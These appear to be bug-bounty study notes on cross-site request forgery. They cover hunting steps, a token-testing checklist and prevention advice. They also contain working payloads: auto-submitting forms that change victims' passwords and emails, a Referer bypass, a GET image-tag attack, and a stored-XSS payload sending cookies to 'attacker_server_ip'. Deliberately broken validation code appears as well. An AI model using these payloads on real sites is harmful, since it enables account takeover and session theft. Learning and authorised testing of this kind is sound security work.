CSRF attacks specifically target state-changing requests, like sending tweets and modifying user settings, instead of requests that reveal sensitive user info. This is because attackers won’t be able to read the response to the forged requests sent during a CSRF attack

CSRF attack is possible if:
- **A relevant action:** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

example request to change email functionality
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

>Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

# Hunting for CSRFs

start by discovering state-changing requests that aren’t shielded by CSRF protections
Remember that because browsers like Chrome offer automatic CSRF protection, you need to test with another browser, such as **Firefox**.

### Step 1: Spot State-Changing Actions
1. log in to your target site and browse through it in search of any activity that alters data (state changing request).
2. Go through all the app’s functionalities, clicking all the links. Intercept the generated requests with a proxy like Burp and write down their URL endpoints, Record these endpoints one by one in a list like the following:
	- Change password: `email.example.com/password_change `POST request
	   Request parameters: `new_password`
	- Send email: `email.example.com/send_email` POST request
	  Request parameters: `draft_id`, `recipient_id`

### Step 2: Look for a Lack of CSRF Protections
- Using Burp go for the endpoints u listed at the first step and start inspect for any CSRF protection and Make sure they are satisfying all the 3 conditions discussed earlier: [[#CSRF attack is possible if]]
- Use the search bar at the bottom of the window to look for the string "csrf" or "state". 
- **CSRF tokens** can come in many forms besides POST body parameters; they sometimes show up in request headers, cookies, and URL parameters as well. For example, they might show up like the cookie here:
```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

(POST request body)
new_password=abc123
```

### Step 3: Confirm the Vulnerability
After you’ve found a potentially vulnerable endpoint, you’ll need to confirm the vulnerability, by crafting a malicious HTML form that imitates the request sent by the legitimate site:

HTML Template
```html
<html>
	 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
		 <input type="text" name="new_password" value="Hunter123">
		 <input type="submit" value="Submit">
	 </form>
	<script>document.getElementById("csrf-form").submit();</script>
 </html>
```
open it, it should generate a request that change the password, check if the password changed to "Hunter123" in other words, check if the **target server has accepted the request**
>The goal is to prove that a foreign site can carry out state-changing actions on a user’s behalf

# Methodology and Testing Checklist

**Test CSRF Token**
- Remove the CSRF token and see if application accepts request
- Change the request method from POST to GET
- See if csrf token is tied to user session

**Testing CSRF Tokens and CSRF cookies:**
-   Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   -  Submit a valid CSRF token from another user
-  Submit valid CSRF token and cookie from another user
    - In order to exploit this vulnerability, we need to perform 2 things:
        1. Inject a `csrfKey` cookie in the user's session (HTTP Header injection) 
        2.  Send a CSRF attack to the victim with a known csrf token
        csrf token: `SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb` 
        csrfKey cookie:  `ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH`
        

**Testing Referer header for CSRF attacks:**
- Remove the Referer header `<meta name="referrer" content="never">`
- check what part that is necessary to be included in the referrer header
## Checklist
- [ ] Does every form have a CSRF token?
- [ ] Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)
- [ ] Test the token
	- [ ] can u chain a clickjacking?
	- [ ] Test without the token
		- [ ] Test other HTTP methods without the token (e.g. GET) 
	- [ ] Test without the token value (keep the param name, e.g. &csrf=)
	- [ ] Test with a random token
	- [ ] Test a previous token
	- [ ] Test a token from a different session
	- [ ] Test with a token of the same length
	- [ ] Test for predictability
	- [ ] Test for static values 
		- [ ] Test for known values (e.g. the token is the user-id)
	- [ ] Is the token tied to a cookie other than the session cookie?
	- [ ] Can the token be stolen with XSS?
- [ ] Is the referer header being used to validate the request origin?
- [ ] Do the cookies have SameSite set? (Chrome is lax by default)
	- [ ] Can we submit the request with GET?
	- [ ] Can we override HTTP methods with X-Http-Method-Override: GET
	- [ ] Can we override HTTP methods with method=POST
- [ ] Test Content-Type Header
	- [ ] Remove Content-Type Header
	- [ ] if it's Json try change it to html or text
- [ ] Remove the Origin Header
# Prevention

>The best way to prevent CSRFs is to use *CSRF tokens*

- **CSRF Tokens** : a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. 
	- Token should be unique for each session and/or HTML form so attackers can’t guess the token’s value.
	- Tied with the user session.
	- Tokens should be unpredictable with high entropy so it can't be analyzed.
	- Use the built-in Framework's Implementation for CSRF tokens.
	- Tokens should be transmitted within a hidden field of HTML form or custom header (not common).
	- Tokens generally should not be transmitted within Cookies or URL parameters.
	- Tokens should be generated and saved in the server side in the user session.
	- Validation should be performed regardless the HTTP method (POST, GET, etc..)
	- Request must be rejected when there's no CSRF tokens present or with empty value
	
- **SameSite cookies** : SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. (Strict, Lax, None)
- **Referer-based validation**: applications make use of the HTTP Referer header normally by verifying that the request originated from the application's own domain (less secure).  

CSRF Broken Logic Code:
```python
def validate_token():
 if (request.csrf_token == session.csrf_token):
 pass
 else:
 throw_error("CSRF token incorrect. Request rejected.")
[...]
def process_state_changing_action():
 if request.csrf_token:
 validate_token()
 execute_action()
```

Double submit Broken logic Code:
```python

def validate_referer():
  if (request.referer in allowlisted_domains):
    pass
 else:
   throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action():
 if request.referer:
   validate_referer()
 execute_action()

```
# Escalating the Attack
#### Leak User Information by Using CSRF Scenario

Applications often send or disclose information according to user preferences
let’s say the `example.com` web application sends monthly billing emails to a user email address.
so if it's vulnerable to CSRF we can change these emails to ours and the app will send the billing information to us instead of the user, the following request will make it clear
```
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
email=ATTACKER_EMAIL&csrf_token=
```
#### Stored Self-XSS by Using CSRF Scenario
let’s say that `example.com`’s financial subdomain, finance .example.com, gives users the ability to create nicknames for each of their linked bank accounts. The account nickname field is vulnerable to self-XSS: there is no sanitization, validation, or escaping for user input on the field. However, only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.
However, the endpoint used to change the account nicknames is vulnerable to CSRF.
The application doesn’t properly validate the existence of the CSRF token
```
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
```
This request will change the user’s account nickname and store the XSS payload there. 
The next time a user logs into the account and views their dashboard, they’ll trigger the XSS
#### Take Over User Accounts by Using CSRF Scenario
Sometimes CSRF can even lead to account takeover, this happen if the CSRF occurs on high impact endpoint like 
```
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
password=XXXXX&csrf_token=
```

this can automatically assign the password of any user who visits the malicious page
```html
<html>
 <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
 <input type="text" name="new_password" value="this_account_is_now_mine">
 <input type="text" name="csrf_token" value="">
 <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
# Exploit and Delivering the CSRF Payload

- Basic payload 
```html
<html>
    <body>
        <h1>Hunter</h1>
        <iframe style="display:none" name="hidden-frame"></iframe>
        <form action="https://target-ac941f081e38bc8480279ef400d5002f.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="hidden-frame">
            <input type="hidden" name="email" value="hunter@test.com">
            <input type="hidden" name="csrf" value="UGakAH8DD3auYLXwt2KflE921dYAdtCf">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- Referrer Header bypass
```html
<html>
    <head>
    <!--push state func appending a relative path to the referrer header, here is a query param-->
    <script>history.pushState("", "", "/?{TARGET-DOMAIN}")</script>
    </head>
    <body>
        <h1>Hunter!</h1>
        <form action="https://0afa0013044e1bb781448e94006d00d0.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="hunter6@test.ca">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

- GET-CSRF
`<img src="https://email.example.com/set_password?new_password=this_account_is_now_mine">` as an image posted to a forum. This way, any user who views the forum page would be affected

- Using Stored XSS, an attacker can submit a stored-XSS payload there to make any forum visitor execute the attacker’s malicious script
```javascript
<script>
 document.body.innerHTML += "<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
 <input type="text" name="new_password" value="this_account_is_now_mine">
 <input type='submit' value="Submit">
 </form>";
 document.getElementById("csrf-form").submit();
</script>
```

# Finding Your First CSRF!

1. Spot the state-changing actions on the application and keep a note on their locations and functionality.
2. Check these functionalities for CSRF protection. If you can’t spot any protections, you might have found a vulnerability
3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques
4. Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed.
5. Think of strategies for delivering your payload to end users.
6.  Draft your first CSRF report!
# Resources
- [Bug Bounty Bootcamp book](https://www.amazon.eg/-/en/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544)
- [Rana Kalil's Video - Cross-Site Request Forgery (CSRF) | Complete Guide](https://www.youtube.com/watch?v=7bTNMSqCMI0&list=PLuyTk2_mYISKNFqao_NBzYOWvJFqhVmXN&index=1&t=1509s)
- [OWASP Cheat Sheet Series- CSRF Prevention Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

